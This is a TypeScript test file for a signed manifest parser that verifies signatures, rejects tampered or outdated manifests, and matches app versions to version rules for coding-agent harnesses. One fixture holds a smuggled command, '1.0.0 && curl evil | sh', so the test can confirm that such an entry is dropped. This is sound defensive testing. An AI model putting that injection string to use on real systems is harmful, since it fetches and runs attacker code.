import { describe, expect, it } from 'vitest'
import {
  heldBack,
  isBroken,
  MANIFEST_KEYS,
  parseManifest,
  ruleFor,
  usable,
  verifyManifest,
  type HarnessManifest,
} from './harness-manifest'
import { manifestDocument, manifestSigner } from './testing/manifest'

const current = manifestSigner()
const next = manifestSigner()
const keys = [current.key, next.key]

const DOCUMENT = manifestDocument(42, {
  'claude-code': [{ kettu: '>=0.1.8', recommended: '0.3.326', broken: ['0.3.320'] }],
  codex: [
    { kettu: '<0.1.9', supported: '>=0.160.0 <0.170.0', broken: ['>=0.170.0'] },
    { kettu: '>=0.1.9', supported: '>=0.160.0' },
  ],
})

function verified(document: unknown, minSequence = 0): HarnessManifest {
  const result = verifyManifest(current.sign(document), minSequence, keys)
  if (!result.ok) throw new Error(result.reason)
  return result.manifest
}

describe('the signed harness manifest', () => {
  it('is taken under the current or the next key, and keeps its envelope', () => {
    const signed = current.sign(DOCUMENT)
    const result = verifyManifest(signed, 0, keys)
    expect(result).toMatchObject({ ok: true, signed, manifest: { sequence: 42 } })
    expect(verifyManifest(next.sign(DOCUMENT), 0, keys).ok).toBe(true)
    expect(parseManifest(JSON.stringify(signed), 0, keys).ok).toBe(true)
  })

  it('is refused under another key, changed after signing, or unsigned', () => {
    const stranger = manifestSigner()
    expect(verifyManifest(stranger.sign(DOCUMENT), 0, keys)).toEqual({
      ok: false,
      reason: 'its signature does not hold',
    })
    const signed = current.sign(DOCUMENT)
    const changed = Buffer.from(
      JSON.stringify({ ...DOCUMENT, harnesses: { codex: [{ kettu: '*', broken: ['*'] }] } }),
    ).toString('base64url')
    expect(verifyManifest({ ...signed, payload: changed }, 0, keys).ok).toBe(false)
    expect(parseManifest(JSON.stringify(DOCUMENT), 0, keys).ok).toBe(false)
    expect(verifyManifest({ payload: signed.payload }, 0, keys).ok).toBe(false)
    // The app's own keys are not the throwaway ones.
    expect(verifyManifest(signed, 0, MANIFEST_KEYS).ok).toBe(false)
  })

  it('is refused when its sequence is older than the one kept', () => {
    expect(verifyManifest(current.sign(DOCUMENT), 43, keys)).toEqual({
      ok: false,
      reason: 'its sequence 42 is older than 43',
    })
    expect(verifyManifest(current.sign(DOCUMENT), 42, keys).ok).toBe(true)
    const zero = manifestDocument(0, {})
    expect(verifyManifest(current.sign(zero), 0, keys).ok).toBe(false)
  })

  it('leaves out a harness whose rules do not all read, and fields it does not know', () => {
    const manifest = verified(
      manifestDocument(7, {
        good: [{ kettu: '*', recommended: '1.2.0', later: { anything: true } }],
        bad: [
          { kettu: '*', recommended: '1.0.0' },
          { kettu: 'not a range', recommended: '1.1.0' },
        ],
        unsafe: [{ kettu: '*', recommended: '1.0.0 && curl evil | sh' }],
        hashed: [{ kettu: '*', sha256: { 'darwin-aarch64': 'AB'.repeat(32) } }],
        unhashed: [{ kettu: '*', sha256: { 'darwin-aarch64': 'not a hash' } }],
      }),
    )
    expect([...manifest.harnesses.keys()]).toEqual(['good', 'hashed'])
    expect(manifest.harnesses.get('good')).toEqual([
      { kettu: '*', recommended: '1.2.0', broken: [], sha256: {} },
    ])
    expect(manifest.harnesses.get('hashed')?.[0]?.sha256).toEqual({
      'darwin-aarch64': 'ab'.repeat(32),
    })
  })
})

describe('the rule for this version of Kettu', () => {
  const manifest = verified(DOCUMENT)

  it('is the first whose Kettu range holds it, pre-releases included', () => {
    expect(ruleFor(manifest, 'codex', '0.1.8')?.supported).toBe('>=0.160.0 <0.170.0')
    expect(ruleFor(manifest, 'codex', '0.1.9')?.supported).toBe('>=0.160.0')
    expect(ruleFor(manifest, 'codex', '0.1.9-beta.1')?.supported).toBe('>=0.160.0 <0.170.0')
    expect(ruleFor(manifest, 'claude-code', '0.1.7')).toBeNull()
    expect(ruleFor(manifest, 'opencode', '0.1.9')).toBeNull()
    expect(ruleFor(null, 'codex', '0.1.9')).toBeNull()
  })

  it('says which versions do not work: broken ones, and those outside its supported range', () => {
    const old = ruleFor(manifest, 'codex', '0.1.8')
    expect(isBroken(old, '0.170.0')).toBe(true)
    expect(isBroken(old, '0.171.0-alpha.1')).toBe(true)
    expect(usable(old, '0.169.0')).toBe(true)
    expect(usable(old, '0.150.0')).toBe(false)
    expect(isBroken(old, '0.150.0')).toBe(false)
    const fixed = ruleFor(manifest, 'codex', '0.1.9')
    expect(usable(fixed, '0.170.0')).toBe(true)
    const sdk = ruleFor(manifest, 'claude-code', '0.1.9')
    expect(usable(sdk, '0.3.320')).toBe(false)
    expect(usable(sdk, '0.3.326')).toBe(true)
    expect(usable(null, '0.3.320')).toBe(true)
  })

  it('holds versions back from a harness’s preferred interface, and reads no other range as one', () => {
    const manifest = verified(
      manifestDocument(43, {
        opencode: [{ kettu: '>=0.1.13', fallback: '>=2.3.5 <2.3.8' }],
        pi: [{ kettu: '*', fallback: 'not a range' }],
      }),
    )
    const rule = ruleFor(manifest, 'opencode', '0.1.13')
    expect(heldBack(rule, '2.3.6')).toBe(true)
    expect(heldBack(rule, '2.3.8')).toBe(false)
    expect(heldBack(ruleFor(manifest, 'opencode', '0.1.12'), '2.3.6')).toBe(false)
    expect(heldBack(null, '2.3.6')).toBe(false)
    // A rule that does not read drops its harness whole, as for any other field.
    expect(manifest.harnesses.has('pi')).toBe(false)
  })
})
